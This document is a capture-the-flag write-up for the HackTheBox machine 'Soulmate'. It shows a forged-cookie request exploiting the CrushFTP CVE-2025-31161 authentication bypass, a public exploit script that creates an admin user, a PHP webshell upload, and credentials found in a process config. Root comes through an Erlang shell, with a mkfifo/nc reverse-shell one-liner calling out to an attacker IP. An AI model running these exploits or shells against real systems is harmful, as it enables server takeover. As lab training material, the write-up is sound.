---
title: Soulmate - HTB
date: 2026-01-25
categories: [WriteUps, HTB]
tags: [HTB, linux, web, privesc, RCE]
image:
  base: /assets/img/posts/htb/soulmate
active: false
difficulty: easy
os: linux
description: "Soulmate is a HackTheBox machine (no season)."
pawned: root
---

## Scan

```bash
sudo nmap -n -sV -sS -Pn -T4 -p- -oN scan.txt 10.129.11.184
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
# 80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Port 80 redirects to `http://soulmate.htb/` — add it to `/etc/hosts`:

```bash
echo '10.129.11.184 soulmate.htb' | sudo tee -a /etc/hosts
```

---

## Foothold

### Subdomain Enumeration

```bash
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FHOST \
  -u http://soulmate.htb/ -H 'Host: FHOST.soulmate.htb' -t 100 -fs 154
# ftp  [Status: 302]
```

```bash
echo '10.129.11.184 ftp.soulmate.htb' | sudo tee -a /etc/hosts
```

### CrushFTP — CVE-2025-31161 Auth Bypass

`ftp.soulmate.htb` runs **CrushFTP**, vulnerable to [CVE-2025-31161](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation) — an authentication bypass that allows arbitrary user creation.

The exploit works by forging a `CrushAuth` cookie where the last 4 digits match the `c2f` parameter, and sending an AWS authorization header with the target username. Confirm the bypass is working:

```http
GET /WebInterface/function/?command=getUserList&serverGroup=MainUser&c2f=1111 HTTP/1.1
Host: ftp.soulmate.htb
Cookie: CrushAuth=1769509924438_1gYkwgZ6rDpcdcfGhcjhVVoyay1111
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
```

Response confirms access as `crushadmin`. Now create a new admin user:

```bash
git clone https://github.com/f4dee-backup/CVE-2025-31161.git
cd CVE-2025-31161

./CVE-2025-31161.sh --url http://ftp.soulmate.htb/ --port 80 \
  --target-user crushadmin --new-user admin --new-password pass123
# [>] User successfully created: admin
```

### User Discovery and Password Reset

Log in to `http://ftp.soulmate.htb/WebInterface/UserManager/index.html`. The user list reveals:

```
ben, jenna, crushadmin, TempAccount, default
```

Reset `ben`'s password via the user manager panel — he has write access to the `webProd` folder (the live website root).

### Webshell Upload → RCE

Upload a PHP webshell to the `webProd` folder via the CrushFTP interface:

![Upload Webshell]({{page.image.base}}/upload-webshell.png)

Start a listener and trigger the shell:

```bash
rlwrap nc -nlvp 4444 -s 10.10.16.40
```

Navigate to `http://soulmate.htb/webshell.php` to execute it:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## User

Enumerating running processes reveals an Erlang service running as root:

```bash
ps aux | grep erlang
# /usr/local/lib/erlang_login/start.escript -sname ssh_runner ...
```

![Erlang Script]({{page.image.base}}/erlang-script.png)

The process config contains credentials for `ben`:

```
ben:HouseH0ldings998
```

```bash
ssh ben@soulmate.htb
# Password: HouseH0ldings998
ben@soulmate:~$ cat user.txt
```

---

## Root

### Erlang SSH Listener

Checking local listeners:

![Network Listeners]({{page.image.base}}/network-listeners.png)

Port `2222` is bound to localhost — the Erlang SSH runner from earlier. Since the process runs as root, connecting to it gives us an Erlang shell with root privileges:

```bash
ssh -p2222 127.0.0.1
(ssh_runner@soulmate)1>
```

### OS Command Execution via Erlang

The `os` module is loaded and exposes `os:cmd/1` for arbitrary command execution:

```erlang
(ssh_runner@soulmate)2> os:cmd('id').
"uid=0(root) gid=0(root) groups=0(root)\n"
```

`/dev/tcp` is unavailable in this shell, so use `mkfifo` for the reverse shell:

```bash
# On attacker
rlwrap nc -nlvp 4444 -s 10.10.16.40
```

```erlang
(ssh_runner@soulmate)3> os:cmd('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.40 4444 > /tmp/f').
```

```bash
# uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```